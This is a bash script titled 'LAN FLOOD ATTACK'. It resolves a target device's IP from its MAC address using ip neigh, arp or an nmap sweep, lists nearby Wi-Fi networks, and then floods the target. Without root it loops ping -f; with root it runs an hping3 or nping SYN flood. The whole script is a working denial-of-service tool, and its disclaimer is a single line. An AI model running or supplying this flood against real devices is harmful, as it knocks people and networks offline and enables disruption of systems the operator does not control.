#!/bin/bash

# ANSI Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Check for root
if [[ $EUID -ne 0 ]]; then
    echo -e "${YELLOW}[!] Warning: Running without root privileges. Limited attack methods available.${NC}"
    ROOT_MODE=false
else
    echo -e "${GREEN}[✓] Running with root privileges. Advanced attacks enabled.${NC}"
    ROOT_MODE=true
fi

# Validate MAC address
validate_mac() {
    [[ "$1" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] && return 0 || return 1
}

# Validate IP address
validate_ip() {
    [[ "$1" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]] && return 0 || return 1
}

# Resolve IP from MAC
resolve_ip() {
    local mac="$1"
    echo -e "${BLUE}[*] Resolving IP for MAC: $mac...${NC}"

    # Try `ip neigh`
    ip=$(ip neigh | grep -i "$mac" | awk '{print $1}')
    if [[ -n "$ip" ]]; then
        echo -e "${GREEN}[✓] Found IP: $ip (via ip neigh)${NC}"
        echo "$ip"
        return 0
    fi

    # Try `arp -a`
    ip=$(arp -a | grep -i "$mac" | awk '{print $2}' | tr -d '()')
    if [[ -n "$ip" ]]; then
        echo -e "${GREEN}[✓] Found IP: $ip (via arp -a)${NC}"
        echo "$ip"
        return 0
    fi

    # Try `nmap -sn` (requires root)
    if [[ "$ROOT_MODE" = true ]]; then
        echo -e "${BLUE}[*] Scanning network with nmap...${NC}"
        ip=$(nmap -sn 192.168.1.0/24 | grep -i -B 2 "$mac" | awk '/Nmap scan/{print $5}')
        if [[ -n "$ip" ]]; then
            echo -e "${GREEN}[✓] Found IP: $ip (via nmap)${NC}"
            echo "$ip"
            return 0
        fi
    fi

    echo -e "${RED}[-] Failed to resolve IP from MAC.${NC}"
    return 1
}

# List nearby networks (Wi-Fi)
list_networks() {
    echo -e "${CYAN}[*] Nearby Wi-Fi Networks:${NC}"
    if command -v nmcli &> /dev/null; then
        nmcli dev wifi list
    elif command -v iwlist &> /dev/null; then
        iwlist scan 2>/dev/null | grep ESSID
    else
        echo -e "${RED}[-] No tools available to list networks.${NC}"
    fi
}

# Ping flood (no root)
ping_flood() {
    local ip="$1"
    echo -e "${YELLOW}[*] Starting PING FLOOD (no root)...${NC}"
    echo -e "${YELLOW}Press Ctrl+C to stop.${NC}"
    while true; do
        ping -f -c 1000 "$ip" 2>&1 | grep "bytes from"
        sleep 1
    done
}

# Advanced flood (root)
advanced_flood() {
    local ip="$1"
    echo -e "${RED}[*] Starting ADVANCED FLOOD (root)...${NC}"
    echo -e "${YELLOW}Press Ctrl+C to stop.${NC}"

    # Check for hping3, nping, or fallback to ping -f
    if command -v hping3 &> /dev/null; then
        hping3 --flood -d 120 -S -p 80 "$ip"
    elif command -v nping &> /dev/null; then
        nping --tcp --flags SYN --rate 1000 "$ip"
    else
        ping -f "$ip"
    fi
}

# Main script
echo -e "${CYAN}\n==== LAN FLOOD ATTACK ====${NC}"
echo -e "${YELLOW}Disclaimer: Use only on authorized networks.${NC}\n"

# Ask for MAC
read -p "Enter target MAC (XX:XX:XX:XX:XX:XX): " mac
while ! validate_mac "$mac"; do
    echo -e "${RED}[-] Invalid MAC format. Try again.${NC}"
    read -p "Enter target MAC (XX:XX:XX:XX:XX:XX): " mac
done

# Resolve IP
ip=$(resolve_ip "$mac")
if [[ -z "$ip" ]]; then
    echo -e "${YELLOW}[!] Could not resolve IP from MAC.${NC}"
    list_networks
    read -p "Enter target IP manually: " ip
    while ! validate_ip "$ip"; do
        echo -e "${RED}[-] Invalid IP format. Try again.${NC}"
        read -p "Enter target IP manually: " ip
    done
fi

# Start attack
echo -e "\n${RED}[!] TARGET LOCKED: $ip (MAC: $mac)${NC}"
read -p "Start attack? (y/n): " confirm
if [[ "$confirm" =~ ^[Yy]$ ]]; then
    if [[ "$ROOT_MODE" = true ]]; then
        advanced_flood "$ip"
    else
        ping_flood "$ip"
    fi
else
    echo -e "${GREEN}[✓] Attack canceled.${NC}"
    exit 0
fi
